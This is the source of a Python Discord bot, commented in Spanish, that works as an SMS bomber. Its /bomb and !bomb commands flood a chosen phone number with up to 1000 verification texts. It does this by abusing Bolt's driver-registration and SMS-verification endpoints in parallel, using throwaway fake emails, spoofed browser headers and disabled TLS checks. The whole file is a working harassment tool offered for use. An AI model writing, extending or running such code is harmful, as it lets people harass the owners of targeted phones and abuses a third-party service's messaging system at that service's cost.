#!/usr/bin/env python3
"""
Discord SMS Bomber Bot - MODO AGRESIVO
Solo usa APIs verificadas que realmente envian SMS
"""

import discord
from discord.ext import commands
from discord import app_commands
import requests
import asyncio
import uuid
import os
import urllib3
from concurrent.futures import ThreadPoolExecutor
urllib3.disable_warnings()

TOKEN = os.environ.get("DISCORD_TOKEN")
if not TOKEN:
    print("ERROR: Configura la variable DISCORD_TOKEN")
    exit(1)

intents = discord.Intents.default()
intents.message_content = True
bot = commands.Bot(command_prefix="!", intents=intents)

# Thread pool para requests paralelos
executor = ThreadPoolExecutor(max_workers=20)

class SMSBomber:
    def __init__(self):
        self.results = {"success": 0, "failed": 0}
        self.session = requests.Session()
        self.session.verify = False

    def reset(self):
        self.results = {"success": 0, "failed": 0}

    def generate_uuid(self):
        return str(uuid.uuid4())

    def generate_email(self):
        return f"user{uuid.uuid4().hex[:10]}@gmail.com"

    # ========== BOLT - API VERIFICADA ==========
    def bolt_sync(self, phone):
        """Version sincrona de Bolt para usar con ThreadPoolExecutor"""
        try:
            # PASO 1: Obtener token con email unico
            url1 = "https://driverregistration.live.boltsvc.net/driverRegistration/startRegistration"
            params = {
                "version": "HP.24.33",
                "device_name": "HP",
                "device_os_version": "web",
                "deviceId": "web",
                "deviceType": "web",
                "language": "es-es"
            }
            headers1 = {
                "Content-Type": "application/json",
                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
                "Accept": "application/json",
                "Origin": "https://bolt.eu",
                "Referer": "https://bolt.eu/"
            }
            data1 = {
                "email": self.generate_email(),
                "phone": phone,
                "city_id": 1617,
                "terms_consent_accepted": 1
            }

            resp1 = self.session.post(url1, params=params, headers=headers1, json=data1, timeout=10)
            if resp1.status_code != 200:
                return False

            resp1_json = resp1.json()
            if resp1_json.get("code") != 0:
                return False

            token = resp1_json["data"]["token"]

            # PASO 2: Enviar SMS
            url2 = "https://driverregistration.live.boltsvc.net/driverRegistration/startVerification?brand=bolt"
            headers2 = {
                "Content-Type": "application/json",
                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
                "Accept": "application/json",
                "Origin": "https://signup.bolt.eu",
                "Referer": "https://signup.bolt.eu/"
            }
            data2 = {
                "token": token,
                "verification_code_channel": "sms",
                "device_os_version": "web",
                "device_name": "Mozilla/5.0 Chrome/120.0.0.0",
                "deviceId": self.generate_uuid(),
                "device_type": "web",
                "version": "DR.3.90",
                "language": "es-es",
                "visitor_id": f"visitor-driver-{self.generate_uuid()}"
            }

            resp2 = self.session.post(url2, headers=headers2, json=data2, timeout=10)
            if resp2.status_code == 200:
                resp2_json = resp2.json()
                if resp2_json.get("code") == 0:
                    return True
            return False
        except:
            return False

    async def bolt(self, phone):
        """Version async que ejecuta en thread pool"""
        loop = asyncio.get_event_loop()
        result = await loop.run_in_executor(executor, self.bolt_sync, phone)
        if result:
            self.results["success"] += 1
        else:
            self.results["failed"] += 1
        return result

    async def bomb_parallel(self, phone, count, batch_size=10):
        """Enviar multiples SMS en paralelo"""
        for i in range(0, count, batch_size):
            batch = min(batch_size, count - i)
            tasks = [self.bolt(phone) for _ in range(batch)]
            await asyncio.gather(*tasks)
            yield i + batch

bomber = SMSBomber()

@bot.event
async def on_ready():
    print(f"="*50)
    print(f"  BOT CONECTADO: {bot.user}")
    print(f"  Servidores: {len(bot.guilds)}")
    print(f"  MODO: AGRESIVO (solo Bolt)")
    print(f"="*50)
    try:
        synced = await bot.tree.sync()
        print(f"  Comandos sincronizados: {len(synced)}")
    except Exception as e:
        print(f"  Error sync: {e}")

@bot.tree.command(name="bomb", description="Bombardear numero con SMS")
@app_commands.describe(
    phone="Numero con codigo (+34...)",
    count="Cantidad de SMS (max 1000)"
)
async def bomb_command(interaction: discord.Interaction, phone: str, count: int = 50):
    if not phone.startswith("+"):
        phone = "+34" + phone

    # Limite aumentado
    if count > 1000:
        count = 1000
    if count < 1:
        count = 1

    bomber.reset()

    await interaction.response.send_message(
        f"```\n"
        f"SMS BOMBER - MODO AGRESIVO\n"
        f"{'='*35}\n"
        f"Target: {phone}\n"
        f"Cantidad: {count}\n"
        f"Metodo: Bolt (paralelo x10)\n"
        f"{'='*35}\n"
        f"Iniciando bombardeo...\n"
        f"```"
    )

    # Bombardeo en paralelo
    async for progress in bomber.bomb_parallel(phone, count, batch_size=10):
        if progress % 20 == 0 or progress == count:
            await interaction.edit_original_response(content=
                f"```\n"
                f"SMS BOMBER EN PROGRESO\n"
                f"{'='*35}\n"
                f"Target: {phone}\n"
                f"Progreso: {progress}/{count}\n"
                f"Exitosos: {bomber.results['success']}\n"
                f"Fallidos: {bomber.results['failed']}\n"
                f"{'='*35}\n"
                f"```"
            )

    await interaction.edit_original_response(content=
        f"```\n"
        f"SMS BOMBER COMPLETADO\n"
        f"{'='*35}\n"
        f"Target: {phone}\n"
        f"Total intentos: {count}\n"
        f"SMS ENVIADOS: {bomber.results['success']}\n"
        f"Fallidos: {bomber.results['failed']}\n"
        f"{'='*35}\n"
        f"```"
    )

@bot.tree.command(name="services", description="Ver servicios activos")
async def services_command(interaction: discord.Interaction):
    await interaction.response.send_message(
        f"```\n"
        f"SERVICIOS ACTIVOS\n"
        f"{'='*35}\n"
        f"  [OK] Bolt (verificado, paralelo)\n"
        f"{'='*35}\n"
        f"Otros servicios requieren captura\n"
        f"con Burp Suite para activarlos.\n"
        f"{'='*35}\n"
        f"```"
    )

@bot.tree.command(name="help", description="Ver comandos")
async def help_command(interaction: discord.Interaction):
    await interaction.response.send_message(
        f"```\n"
        f"SMS BOMBER BOT - COMANDOS\n"
        f"{'='*35}\n"
        f"/bomb <numero> <cantidad>\n"
        f"   Bombardear numero con SMS\n"
        f"   Ejemplo: /bomb +34612345678 100\n"
        f"   Max: 1000 SMS por comando\n"
        f"\n"
        f"/services\n"
        f"   Ver servicios activos\n"
        f"\n"
        f"/help\n"
        f"   Ver esta ayuda\n"
        f"{'='*35}\n"
        f"```"
    )

# Comando con prefijo !
@bot.command(name="bomb")
async def bomb_prefix(ctx, phone: str, count: int = 50):
    if not phone.startswith("+"):
        phone = "+34" + phone
    if count > 1000:
        count = 1000

    bomber.reset()
    msg = await ctx.send(f"```\nBombardeando {phone} con {count} SMS...\n```")

    async for progress in bomber.bomb_parallel(phone, count, batch_size=10):
        if progress % 50 == 0 or progress == count:
            await msg.edit(content=
                f"```\nProgreso: {progress}/{count} | OK: {bomber.results['success']}\n```"
            )

    await msg.edit(content=
        f"```\n"
        f"COMPLETADO\n"
        f"Target: {phone}\n"
        f"SMS enviados: {bomber.results['success']}/{count}\n"
        f"```"
    )

if __name__ == "__main__":
    print("\nIniciando bot en modo agresivo...")
    bot.run(TOKEN)
